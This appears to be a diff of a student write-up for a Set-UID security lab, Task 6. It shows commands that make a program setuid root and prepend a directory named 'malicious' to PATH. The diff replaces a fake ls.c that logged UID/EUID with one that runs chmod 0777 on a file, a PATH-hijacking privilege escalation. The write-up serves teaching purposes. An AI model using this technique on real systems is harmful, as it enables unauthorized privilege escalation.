@@ -12,27 +12,27 @@ The SET_UID program the calling process's environment, but the system's secure e
 
 TASK 6:
 After compiling the program and following the steps from the previous task to change its owner to root, and make it a Set-UID program with the following instructions:
+
    $ gcc mynewset.c (name of the program)
    $ sudo chown root a.out (changing the exacutable output of the program to root)
    $ sudo shmod 4755 a.out (making it a SET-UID program)
+
 A new directory needs to be created. Here I chose the name malicious, and put it in front of PATH:
+
    $ mkdir -p ~/malicious
    $ export PATH="$HOME/malicious:$PATH"
+
 And created a program called ls.c inside said directory with the code:
+
 "#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
 
-int main(void) {
-    FILE *f = fopen("/tmp/ls_output.txt", "w");
-    if (f) {
-        fprintf(f, "real uid=%d, real euid=%d\n", (int)getuid(), (int)geteuid());
-        fclose(f);
-    }
-    return 0;
+int main()
+{
+	system("chmod 0777 /home/seed/malicious/file");
+	return 0;
 }"
-With the objective of getting the UID and the EUID.
-ls.c then needs to be compiled and made into an executable:
+
+ls.c then needs to be compiled:
    $ gcc ~/malicious/ls.c -o ~/malicious/ls
-   $ chmod +x ~/malicious/ls
